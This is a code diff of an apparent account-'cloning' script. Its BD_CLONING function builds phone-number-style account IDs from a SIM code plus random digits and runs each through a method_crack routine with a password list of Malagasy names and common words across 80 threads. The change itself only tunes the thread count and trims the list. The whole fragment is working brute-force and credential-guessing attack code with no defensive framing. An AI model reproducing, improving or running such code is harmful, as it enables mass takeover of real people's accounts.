@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=90) as Dipto:
+    with tred(max_workers=80) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],ids[6:],'fanantenana','Fanantenana','malala','Malala','solofo','mendrika','Mendrika','rahova','Rahova','mandresy','Mandresy','lalaina','Lalaina','voary','Voary','mamisoa','Mamisoa','miora','Miora','Diamondra','felana','Felana','diamondra','mamisoa','Mamisoa','Solofo','randria','Randria','razafy','Razafy','valisoa','Valisoa','football','Football','tolotra','Tolotra','fanoherana','Fanoherana','marary','Marary','nasandratra','Nasandratra','solofoniaina','Solofoniaina','vadiko','Vadiko','mamako','Mamako','milely','Milely','mamiko','Mamiko','fahendrena','Fahendrena','fandresena','Fandresena','finoana','Finoana','fiderana','Fiderana','safidy','Safidy','tahiana','Tahiana','tsiferana','Tsiferana','fitiavana','Fitiavana','nomena','Nomena','Sitraka','sitraka','heriniaina','Heriniaina','mahery','Mahery','fenohery','Fenohery','Nantenaina','nantenaina','nahary','Nahary','malaso','Malaso','tsilavina','Tsilavina','solonandrasana','Solonandrasana','fifaliana','Fifaliana',]
+            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],ids[6:],'fanantenana','Fanantenana','malala','Malala','solofo','mendrika','Mendrika','mandresy','lalaina','voary','mamisoa','miora','felana','diamondra','mamisoa','Solofo','randria','Randria','razafy','Razafy','valisoa','Valisoa','football','Football','tolotra','Tolotra','fanoherana','Fanoherana','marary','Marary','nasandratra','Nasandratra','solofoniaina','Solofoniaina','vadiko','Vadiko','mamako','Mamako','milely','Milely','mamiko','Mamiko','fahendrena','Fahendrena','fandresena','Fandresena','finoana','Finoana','fiderana','Fiderana','safidy','Safidy','tahiana','Tahiana','tsiferana','Tsiferana','fitiavana','Fitiavana','nomena','Nomena','Sitraka','sitraka','heriniaina','Heriniaina','mahery','Mahery','fenohery','Fenohery','Nantenaina','nantenaina','nahary','Nahary','malaso','Malaso','tsilavina','Tsilavina','solonandrasana','Solonandrasana','fifaliana','Fifaliana',]
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
